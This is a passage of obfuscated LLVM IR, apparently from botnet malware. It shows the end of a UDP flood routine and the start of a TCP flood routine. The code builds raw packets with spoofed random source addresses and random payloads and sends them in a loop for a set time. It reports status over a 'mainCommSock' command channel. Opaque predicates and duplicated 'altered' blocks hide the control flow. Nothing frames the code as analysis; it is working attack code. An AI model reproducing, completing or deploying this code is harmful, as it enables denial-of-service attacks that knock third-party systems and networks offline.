  %252 = or i1 %250, %251
  br i1 %252, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %244
  %253 = load i32, i32* @mainCommSock, align 4
  %254 = call i32 (i32, i8*, ...) @sockprintf(i32 %253, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.181, i32 0, i32 0))
  %255 = load i32, i32* @x.87
  %256 = load i32, i32* @y.88
  %257 = sub i32 %255, 1
  %258 = mul i32 %255, %257
  %259 = urem i32 %258, 2
  %260 = icmp eq i32 %259, 0
  %261 = icmp slt i32 %256, 10
  %262 = or i1 %260, %261
  br i1 %262, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br label %503

; <label>:263:                                    ; preds = %239
  store i32 50, i32* %34, align 4
  br label %264

; <label>:264:                                    ; preds = %originalBBpart253, %263
  %265 = load i32, i32* %34, align 4
  %266 = add nsw i32 %265, -1
  store i32 %266, i32* %34, align 4
  %267 = icmp ne i32 %265, 0
  br i1 %267, label %268, label %289

; <label>:268:                                    ; preds = %264
  %269 = load i32, i32* @x.87
  %270 = load i32, i32* @y.88
  %271 = sub i32 %269, 1
  %272 = mul i32 %269, %271
  %273 = urem i32 %272, 2
  %274 = icmp eq i32 %273, 0
  %275 = icmp slt i32 %270, 10
  %276 = or i1 %274, %275
  br i1 %276, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %268
  %277 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %278 = call i32 @rand_cmwc()
  %279 = xor i32 %277, %278
  call void @srand(i32 %279) #2
  %280 = call i32 @rand() #2
  call void @init_rand(i32 %280)
  %281 = load i32, i32* @x.87
  %282 = load i32, i32* @y.88
  %283 = sub i32 %281, 1
  %284 = mul i32 %281, %283
  %285 = urem i32 %284, 2
  %286 = icmp eq i32 %285, 0
  %287 = icmp slt i32 %282, 10
  %288 = or i1 %286, %287
  br i1 %288, label %originalBBpart253, label %originalBB46alteredBB

originalBBpart253:                                ; preds = %originalBB46
  br label %264

; <label>:289:                                    ; preds = %264
  %290 = load i32, i32* %20, align 4
  %291 = icmp eq i32 %290, 0
  br i1 %291, label %292, label %309

; <label>:292:                                    ; preds = %289
  %293 = load i32, i32* @x.87
  %294 = load i32, i32* @y.88
  %295 = sub i32 %293, 1
  %296 = mul i32 %293, %295
  %297 = urem i32 %296, 2
  %298 = icmp eq i32 %297, 0
  %299 = icmp slt i32 %294, 10
  %300 = or i1 %298, %299
  br i1 %300, label %originalBB55, label %originalBB55alteredBB

originalBB55:                                     ; preds = %originalBB55alteredBB, %292
  store i32 0, i32* %35, align 4
  %301 = load i32, i32* @x.87
  %302 = load i32, i32* @y.88
  %303 = sub i32 %301, 1
  %304 = mul i32 %301, %303
  %305 = urem i32 %304, 2
  %306 = icmp eq i32 %305, 0
  %307 = icmp slt i32 %302, 10
  %308 = or i1 %306, %307
  br i1 %308, label %originalBBpart257, label %originalBB55alteredBB

originalBBpart257:                                ; preds = %originalBB55
  br label %315

; <label>:309:                                    ; preds = %289
  %310 = load i32, i32* %20, align 4
  %311 = sub nsw i32 32, %310
  %312 = shl i32 1, %311
  %313 = sub nsw i32 %312, 1
  %314 = xor i32 %313, -1
  store i32 %314, i32* %35, align 4
  br label %315

; <label>:315:                                    ; preds = %309, %originalBBpart257
  %316 = load i32, i32* @x.87
  %317 = load i32, i32* @y.88
  %318 = sub i32 %316, 1
  %319 = mul i32 %316, %318
  %320 = urem i32 %319, 2
  %321 = icmp eq i32 %320, 0
  %322 = icmp slt i32 %317, 10
  %323 = or i1 %321, %322
  br i1 %323, label %originalBB59, label %originalBB59alteredBB

originalBB59:                                     ; preds = %originalBB59alteredBB, %315
  %324 = load i32, i32* %21, align 4
  %325 = sext i32 %324 to i64
  %326 = add i64 28, %325
  %327 = call i8* @llvm.stacksave()
  store i8* %327, i8** %36, align 8
  %328 = alloca i8, i64 %326, align 16
  %329 = bitcast i8* %328 to %struct.iphdr*
  store %struct.iphdr* %329, %struct.iphdr** %37, align 8
  %330 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %331 = bitcast %struct.iphdr* %330 to i8*
  %332 = getelementptr i8, i8* %331, i64 20
  %333 = bitcast i8* %332 to %struct.udphdr*
  store %struct.udphdr* %333, %struct.udphdr** %38, align 8
  %334 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %335 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %25, i32 0, i32 2
  %336 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %335, i32 0, i32 0
  %337 = load i32, i32* %336, align 4
  %338 = load i32, i32* %35, align 4
  %339 = call i32 @GetRandomIP(i32 %338)
  %340 = call i32 @htonl(i32 %339) #13
  %341 = load i32, i32* %21, align 4
  %342 = sext i32 %341 to i64
  %343 = add i64 8, %342
  %344 = trunc i64 %343 to i32
  call void @makeIPPacket(%struct.iphdr* %334, i32 %337, i32 %340, i8 zeroext 17, i32 %344)
  %345 = load i32, i32* %21, align 4
  %346 = sext i32 %345 to i64
  %347 = add i64 8, %346
  %348 = trunc i64 %347 to i16
  %349 = call zeroext i16 @htons(i16 zeroext %348) #13
  %350 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %351 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %350, i32 0, i32 0
  %352 = bitcast %union.anon.2* %351 to %struct.anon.3*
  %353 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %352, i32 0, i32 2
  store i16 %349, i16* %353, align 2
  %354 = call i32 @rand_cmwc()
  %355 = trunc i32 %354 to i16
  %356 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %357 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %356, i32 0, i32 0
  %358 = bitcast %union.anon.2* %357 to %struct.anon.3*
  %359 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %358, i32 0, i32 0
  store i16 %355, i16* %359, align 2
  %360 = load i32, i32* %18, align 4
  %361 = icmp eq i32 %360, 0
  %362 = load i32, i32* @x.87
  %363 = load i32, i32* @y.88
  %364 = sub i32 %362, 1
  %365 = mul i32 %362, %364
  %366 = urem i32 %365, 2
  %367 = icmp eq i32 %366, 0
  %368 = icmp slt i32 %363, 10
  %369 = or i1 %367, %368
  br i1 %369, label %originalBBpart296, label %originalBB59alteredBB

originalBBpart296:                                ; preds = %originalBB59
  br i1 %361, label %370, label %388

; <label>:370:                                    ; preds = %originalBBpart296
  %371 = load i32, i32* @x.87
  %372 = load i32, i32* @y.88
  %373 = sub i32 %371, 1
  %374 = mul i32 %371, %373
  %375 = urem i32 %374, 2
  %376 = icmp eq i32 %375, 0
  %377 = icmp slt i32 %372, 10
  %378 = or i1 %376, %377
  br i1 %378, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %370
  %379 = call i32 @rand_cmwc()
  %380 = load i32, i32* @x.87
  %381 = load i32, i32* @y.88
  %382 = sub i32 %380, 1
  %383 = mul i32 %380, %382
  %384 = urem i32 %383, 2
  %385 = icmp eq i32 %384, 0
  %386 = icmp slt i32 %381, 10
  %387 = or i1 %385, %386
  br i1 %387, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  br label %393

; <label>:388:                                    ; preds = %originalBBpart296
  %389 = load i32, i32* %18, align 4
  %390 = trunc i32 %389 to i16
  %391 = call zeroext i16 @htons(i16 zeroext %390) #13
  %392 = zext i16 %391 to i32
  br label %393

; <label>:393:                                    ; preds = %388, %originalBBpart2100
  %394 = phi i32 [ %379, %originalBBpart2100 ], [ %392, %388 ]
  %395 = trunc i32 %394 to i16
  %396 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %397 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %396, i32 0, i32 0
  %398 = bitcast %union.anon.2* %397 to %struct.anon.3*
  %399 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %398, i32 0, i32 1
  store i16 %395, i16* %399, align 2
  %400 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %401 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %400, i32 0, i32 0
  %402 = bitcast %union.anon.2* %401 to %struct.anon.3*
  %403 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %402, i32 0, i32 3
  store i16 0, i16* %403, align 2
  %404 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %405 = bitcast %struct.udphdr* %404 to i8*
  %406 = getelementptr inbounds i8, i8* %405, i64 8
  %407 = load i32, i32* %21, align 4
  call void @makeRandomStr(i8* %406, i32 %407)
  %408 = bitcast i8* %328 to i16*
  %409 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %410 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %409, i32 0, i32 2
  %411 = load i16, i16* %410, align 2
  %412 = zext i16 %411 to i32
  %413 = call zeroext i16 @csum(i16* %408, i32 %412)
  %414 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %415 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %414, i32 0, i32 7
  store i16 %413, i16* %415, align 2
  %416 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %417 = load i32, i32* %19, align 4
  %418 = add nsw i32 %416, %417
  store i32 %418, i32* %39, align 4
  store i32 0, i32* %40, align 4
  store i32 0, i32* %41, align 4
  br label %419

; <label>:419:                                    ; preds = %498, %originalBBpart2112, %471, %393
  br label %420

; <label>:420:                                    ; preds = %419
  %421 = load i32, i32* %32, align 4
  %422 = bitcast %struct.sockaddr_in* %25 to %struct.sockaddr*
  %423 = call i64 @sendto(i32 %421, i8* %328, i64 %326, i32 0, %struct.sockaddr* %422, i32 16)
  %424 = call i32 @rand_cmwc()
  %425 = trunc i32 %424 to i16
  %426 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %427 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %426, i32 0, i32 0
  %428 = bitcast %union.anon.2* %427 to %struct.anon.3*
  %429 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %428, i32 0, i32 0
  store i16 %425, i16* %429, align 2
  %430 = load i32, i32* %18, align 4
  %431 = icmp eq i32 %430, 0
  br i1 %431, label %432, label %434

; <label>:432:                                    ; preds = %420
  %433 = call i32 @rand_cmwc()
  br label %439

; <label>:434:                                    ; preds = %420
  %435 = load i32, i32* %18, align 4
  %436 = trunc i32 %435 to i16
  %437 = call zeroext i16 @htons(i16 zeroext %436) #13
  %438 = zext i16 %437 to i32
  br label %439

; <label>:439:                                    ; preds = %434, %432
  %440 = phi i32 [ %433, %432 ], [ %438, %434 ]
  %441 = trunc i32 %440 to i16
  %442 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %443 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %442, i32 0, i32 0
  %444 = bitcast %union.anon.2* %443 to %struct.anon.3*
  %445 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %444, i32 0, i32 1
  store i16 %441, i16* %445, align 2
  %446 = call i32 @rand_cmwc()
  %447 = trunc i32 %446 to i16
  %448 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %449 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %448, i32 0, i32 3
  store i16 %447, i16* %449, align 4
  %450 = load i32, i32* %35, align 4
  %451 = call i32 @GetRandomIP(i32 %450)
  %452 = call i32 @htonl(i32 %451) #13
  %453 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %454 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %453, i32 0, i32 8
  store i32 %452, i32* %454, align 4
  %455 = bitcast i8* %328 to i16*
  %456 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %457 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %456, i32 0, i32 2
  %458 = load i16, i16* %457, align 2
  %459 = zext i16 %458 to i32
  %460 = call zeroext i16 @csum(i16* %455, i32 %459)
  %461 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %462 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %461, i32 0, i32 7
  store i16 %460, i16* %462, align 2
  %463 = load i32, i32* %40, align 4
  %464 = load i32, i32* %26, align 4
  %465 = icmp eq i32 %463, %464
  br i1 %465, label %466, label %472

; <label>:466:                                    ; preds = %439
  %467 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %468 = load i32, i32* %39, align 4
  %469 = icmp sgt i32 %467, %468
  br i1 %469, label %470, label %471

; <label>:470:                                    ; preds = %466
  br label %501

; <label>:471:                                    ; preds = %466
  store i32 0, i32* %40, align 4
  br label %419

; <label>:472:                                    ; preds = %439
  %473 = load i32, i32* %40, align 4
  %474 = add i32 %473, 1
  store i32 %474, i32* %40, align 4
  %475 = load i32, i32* %41, align 4
  %476 = load i32, i32* %23, align 4
  %477 = icmp eq i32 %475, %476
  br i1 %477, label %478, label %498

; <label>:478:                                    ; preds = %472
  %479 = load i32, i32* @x.87
  %480 = load i32, i32* @y.88
  %481 = sub i32 %479, 1
  %482 = mul i32 %479, %481
  %483 = urem i32 %482, 2
  %484 = icmp eq i32 %483, 0
  %485 = icmp slt i32 %480, 10
  %486 = or i1 %484, %485
  br i1 %486, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %478
  %487 = load i32, i32* %24, align 4
  %488 = mul nsw i32 %487, 1000
  %489 = call i32 @usleep(i32 %488)
  store i32 0, i32* %41, align 4
  %490 = load i32, i32* @x.87
  %491 = load i32, i32* @y.88
  %492 = sub i32 %490, 1
  %493 = mul i32 %490, %492
  %494 = urem i32 %493, 2
  %495 = icmp eq i32 %494, 0
  %496 = icmp slt i32 %491, 10
  %497 = or i1 %495, %496
  br i1 %497, label %originalBBpart2112, label %originalBB102alteredBB

originalBBpart2112:                               ; preds = %originalBB102
  br label %419

; <label>:498:                                    ; preds = %472
  %499 = load i32, i32* %41, align 4
  %500 = add i32 %499, 1
  store i32 %500, i32* %41, align 4
  br label %419

; <label>:501:                                    ; preds = %470
  %502 = load i8*, i8** %36, align 8
  call void @llvm.stackrestore(i8* %502)
  br label %503

; <label>:503:                                    ; preds = %501, %originalBBpart244, %236, %231, %136, %126, %originalBBpart212
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %8
  %504 = alloca i8*, align 8
  %505 = alloca i32, align 4
  %506 = alloca i32, align 4
  %507 = alloca i32, align 4
  %508 = alloca i32, align 4
  %509 = alloca i32, align 4
  %510 = alloca i32, align 4
  %511 = alloca i32, align 4
  %512 = alloca %struct.sockaddr_in, align 4
  %513 = alloca i32, align 4
  %514 = alloca i32, align 4
  %515 = alloca i8*, align 8
  %516 = alloca i32, align 4
  %517 = alloca i32, align 4
  %518 = alloca i32, align 4
  %519 = alloca i32, align 4
  %520 = alloca i32, align 4
  %521 = alloca i32, align 4
  %522 = alloca i32, align 4
  %523 = alloca i8*, align 8
  %524 = alloca %struct.iphdr*, align 8
  %525 = alloca %struct.udphdr*, align 8
  %526 = alloca i32, align 4
  %527 = alloca i32, align 4
  %528 = alloca i32, align 4
  store i8* %0, i8** %504, align 8
  store i32 %1, i32* %505, align 4
  store i32 %2, i32* %506, align 4
  store i32 %3, i32* %507, align 4
  store i32 %4, i32* %508, align 4
  store i32 %5, i32* %509, align 4
  store i32 %6, i32* %510, align 4
  store i32 %7, i32* %511, align 4
  %529 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %512, i32 0, i32 0
  store i16 2, i16* %529, align 4
  %530 = load i32, i32* %505, align 4
  %531 = icmp eq i32 %530, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %53
  %532 = call i32 @rand_cmwc()
  %533 = trunc i32 %532 to i16
  %534 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %25, i32 0, i32 1
  store i16 %533, i16* %534, align 2
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %78
  %535 = load i8*, i8** %17, align 8
  %536 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %25, i32 0, i32 2
  %537 = call i32 @getHost(i8* %535, %struct.in_addr* %536)
  %538 = icmp ne i32 %537, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %99
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %147
  %539 = load i32, i32* %27, align 4
  %540 = load i8*, i8** %28, align 8
  %541 = load i32, i32* %21, align 4
  %542 = sext i32 %541 to i64
  %543 = bitcast %struct.sockaddr_in* %25 to %struct.sockaddr*
  %544 = call i64 @sendto(i32 %539, i8* %540, i64 %542, i32 0, %struct.sockaddr* %543, i32 16)
  %545 = load i32, i32* %30, align 4
  %546 = load i32, i32* %26, align 4
  %547 = icmp eq i32 %545, %546
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %186
  %548 = load i32, i32* %30, align 4
  %_ = sub i32 %548, 1
  %gen = mul i32 %_, 1
  %_19 = sub i32 0, %548
  %gen20 = add i32 %_19, 1
  %_21 = sub i32 0, %548
  %gen22 = add i32 %_21, 1
  %_23 = shl i32 %548, 1
  %_24 = sub i32 0, %548
  %gen25 = add i32 %_24, 1
  %549 = add i32 %548, 1
  store i32 %549, i32* %30, align 4
  %550 = load i32, i32* %31, align 4
  %551 = load i32, i32* %23, align 4
  %552 = icmp eq i32 %550, %551
  br label %originalBB18

originalBB29alteredBB:                            ; preds = %originalBB29, %212
  %553 = load i32, i32* %31, align 4
  %_30 = sub i32 0, %553
  %gen31 = add i32 %_30, 1
  %_32 = shl i32 %553, 1
  %_33 = sub i32 0, %553
  %gen34 = add i32 %_33, 1
  %_35 = sub i32 0, %553
  %gen36 = add i32 %_35, 1
  %_37 = sub i32 0, %553
  %gen38 = add i32 %_37, 1
  %554 = add i32 %553, 1
  store i32 %554, i32* %31, align 4
  br label %originalBB29

originalBB42alteredBB:                            ; preds = %originalBB42, %244
  %555 = load i32, i32* @mainCommSock, align 4
  %556 = call i32 (i32, i8*, ...) @sockprintf(i32 %555, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.181, i32 0, i32 0))
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %268
  %557 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %558 = call i32 @rand_cmwc()
  %_47 = shl i32 %557, %558
  %_48 = sub i32 0, %557
  %gen49 = add i32 %_48, %558
  %_50 = sub i32 %557, %558
  %gen51 = mul i32 %_50, %558
  %559 = xor i32 %557, %558
  call void @srand(i32 %559) #2
  %560 = call i32 @rand() #2
  call void @init_rand(i32 %560)
  br label %originalBB46

originalBB55alteredBB:                            ; preds = %originalBB55, %292
  store i32 0, i32* %35, align 4
  br label %originalBB55

originalBB59alteredBB:                            ; preds = %originalBB59, %315
  %561 = load i32, i32* %21, align 4
  %562 = sext i32 %561 to i64
  %_60 = sub i64 28, %562
  %gen61 = mul i64 %_60, %562
  %_62 = sub i64 28, %562
  %gen63 = mul i64 %_62, %562
  %_64 = sub i64 28, %562
  %gen65 = mul i64 %_64, %562
  %_66 = shl i64 28, %562
  %_67 = sub i64 28, %562
  %gen68 = mul i64 %_67, %562
  %_69 = shl i64 28, %562
  %_70 = sub i64 0, 28
  %gen71 = add i64 %_70, %562
  %563 = add i64 28, %562
  %564 = call i8* @llvm.stacksave()
  store i8* %564, i8** %36, align 8
  %565 = alloca i8, i64 %563, align 16
  %566 = bitcast i8* %565 to %struct.iphdr*
  store %struct.iphdr* %566, %struct.iphdr** %37, align 8
  %567 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %568 = bitcast %struct.iphdr* %567 to i8*
  %569 = getelementptr i8, i8* %568, i64 20
  %570 = bitcast i8* %569 to %struct.udphdr*
  store %struct.udphdr* %570, %struct.udphdr** %38, align 8
  %571 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %572 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %25, i32 0, i32 2
  %573 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %572, i32 0, i32 0
  %574 = load i32, i32* %573, align 4
  %575 = load i32, i32* %35, align 4
  %576 = call i32 @GetRandomIP(i32 %575)
  %577 = call i32 @htonl(i32 %576) #13
  %578 = load i32, i32* %21, align 4
  %579 = sext i32 %578 to i64
  %_72 = sub i64 8, %579
  %gen73 = mul i64 %_72, %579
  %_74 = sub i64 0, 8
  %gen75 = add i64 %_74, %579
  %_76 = sub i64 8, %579
  %gen77 = mul i64 %_76, %579
  %_78 = sub i64 8, %579
  %gen79 = mul i64 %_78, %579
  %_80 = sub i64 8, %579
  %gen81 = mul i64 %_80, %579
  %580 = add i64 8, %579
  %581 = trunc i64 %580 to i32
  call void @makeIPPacket(%struct.iphdr* %571, i32 %574, i32 %577, i8 zeroext 17, i32 %581)
  %582 = load i32, i32* %21, align 4
  %583 = sext i32 %582 to i64
  %_82 = sub i64 8, %583
  %gen83 = mul i64 %_82, %583
  %_84 = sub i64 0, 8
  %gen85 = add i64 %_84, %583
  %_86 = sub i64 0, 8
  %gen87 = add i64 %_86, %583
  %_88 = sub i64 0, 8
  %gen89 = add i64 %_88, %583
  %_90 = shl i64 8, %583
  %_91 = sub i64 0, 8
  %gen92 = add i64 %_91, %583
  %_93 = sub i64 0, 8
  %gen94 = add i64 %_93, %583
  %584 = add i64 8, %583
  %585 = trunc i64 %584 to i16
  %586 = call zeroext i16 @htons(i16 zeroext %585) #13
  %587 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %588 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %587, i32 0, i32 0
  %589 = bitcast %union.anon.2* %588 to %struct.anon.3*
  %590 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %589, i32 0, i32 2
  store i16 %586, i16* %590, align 2
  %591 = call i32 @rand_cmwc()
  %592 = trunc i32 %591 to i16
  %593 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %594 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %593, i32 0, i32 0
  %595 = bitcast %union.anon.2* %594 to %struct.anon.3*
  %596 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %595, i32 0, i32 0
  store i16 %592, i16* %596, align 2
  %597 = load i32, i32* %18, align 4
  %598 = icmp eq i32 %597, 0
  br label %originalBB59

originalBB98alteredBB:                            ; preds = %originalBB98, %370
  %599 = call i32 @rand_cmwc()
  br label %originalBB98

originalBB102alteredBB:                           ; preds = %originalBB102, %478
  %600 = load i32, i32* %24, align 4
  %_103 = shl i32 %600, 1000
  %_104 = sub i32 %600, 1000
  %gen105 = mul i32 %_104, 1000
  %_106 = shl i32 %600, 1000
  %_107 = sub i32 %600, 1000
  %gen108 = mul i32 %_107, 1000
  %_109 = sub i32 %600, 1000
  %gen110 = mul i32 %_109, 1000
  %601 = mul nsw i32 %600, 1000
  %602 = call i32 @usleep(i32 %601)
  store i32 0, i32* %41, align 4
  br label %originalBB102
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

declare i32 @usleep(i32) #3

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #8

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %8 = load i32, i32* @x.89
  %9 = load i32, i32* @y.90
  %10 = sub i32 %8, 1
  %11 = mul i32 %8, %10
  %12 = urem i32 %11, 2
  %13 = icmp eq i32 %12, 0
  %14 = icmp slt i32 %9, 10
  %15 = or i1 %13, %14
  br i1 %15, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %7
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca %struct.sockaddr_in, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.tcphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  store i8* %0, i8** %16, align 8
  store i32 %1, i32* %17, align 4
  store i32 %2, i32* %18, align 4
  store i32 %3, i32* %19, align 4
  store i8* %4, i8** %20, align 8
  store i32 %5, i32* %21, align 4
  store i32 %6, i32* %22, align 4
  %34 = load i32, i32* %22, align 4
  store i32 %34, i32* %23, align 4
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 0
  store i16 2, i16* %35, align 4
  %36 = load i32, i32* %17, align 4
  %37 = icmp eq i32 %36, 0
  %38 = load i32, i32* @x.89
  %39 = load i32, i32* @y.90
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %37, label %46, label %50

; <label>:46:                                     ; preds = %originalBBpart2
  %47 = call i32 @rand_cmwc()
  %48 = trunc i32 %47 to i16
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 1
  store i16 %48, i16* %49, align 2
  br label %55

; <label>:50:                                     ; preds = %originalBBpart2
  %51 = load i32, i32* %17, align 4
  %52 = trunc i32 %51 to i16
  %53 = call zeroext i16 @htons(i16 zeroext %52) #13
  %54 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 1
  store i16 %53, i16* %54, align 2
  br label %55

; <label>:55:                                     ; preds = %50, %46
  %56 = load i8*, i8** %16, align 8
  %57 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 2
  %58 = call i32 @getHost(i8* %56, %struct.in_addr* %57)
  %59 = icmp ne i32 %58, 0
  br i1 %59, label %60, label %77

; <label>:60:                                     ; preds = %55
  %61 = load i32, i32* @x.89
  %62 = load i32, i32* @y.90
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %60
  %69 = load i32, i32* @x.89
  %70 = load i32, i32* @y.90
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %595

; <label>:77:                                     ; preds = %55
  %78 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 3
  %79 = getelementptr inbounds [8 x i8], [8 x i8]* %78, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %79, i8 0, i64 8, i32 4, i1 false)
  %80 = call i32 @socket(i32 2, i32 3, i32 6) #2
  store i32 %80, i32* %25, align 4
  %81 = load i32, i32* %25, align 4
  %82 = icmp ne i32 %81, 0
  br i1 %82, label %86, label %83

; <label>:83:                                     ; preds = %77
  %84 = load i32, i32* @mainCommSock, align 4
  %85 = call i32 (i32, i8*, ...) @sockprintf(i32 %84, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.180, i32 0, i32 0))
  br label %595

; <label>:86:                                     ; preds = %77
  store i32 1, i32* %26, align 4
  %87 = load i32, i32* %25, align 4
  %88 = bitcast i32* %26 to i8*
  %89 = call i32 @setsockopt(i32 %87, i32 0, i32 3, i8* %88, i32 4) #2
  %90 = icmp slt i32 %89, 0
  br i1 %90, label %91, label %94

; <label>:91:                                     ; preds = %86
  %92 = load i32, i32* @mainCommSock, align 4
  %93 = call i32 (i32, i8*, ...) @sockprintf(i32 %92, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.181, i32 0, i32 0))
  br label %595

; <label>:94:                                     ; preds = %86
  %95 = load i32, i32* @x.89
  %96 = load i32, i32* @y.90
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %94
  %103 = load i32, i32* %19, align 4
  %104 = icmp eq i32 %103, 0
  %105 = load i32, i32* @x.89
  %106 = load i32, i32* @y.90
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %104, label %113, label %130

; <label>:113:                                    ; preds = %originalBBpart28
  %114 = load i32, i32* @x.89
  %115 = load i32, i32* @y.90
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %113
  store i32 0, i32* %27, align 4
